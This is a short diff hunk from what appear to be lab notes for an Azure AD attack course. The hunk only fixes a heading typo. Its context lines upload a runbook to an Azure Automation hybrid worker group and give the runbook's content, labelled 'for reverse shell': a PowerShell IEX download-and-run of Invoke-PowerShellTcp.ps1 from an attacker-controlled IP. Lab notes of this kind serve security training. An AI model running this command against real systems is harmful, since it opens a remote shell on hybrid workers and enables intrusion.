@@ -107,7 +107,7 @@ Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -Resou
 Import-AzAutomationRunbook -Name student38 -Path C:\AzAD\Tools\student38.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
 ```
 
-#### Contents op studentx.ps1 for reverse shell
+#### Contents off studentx.ps1 for reverse shell
 ```
 IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Invoke-PowerShellTcp.ps1")
 
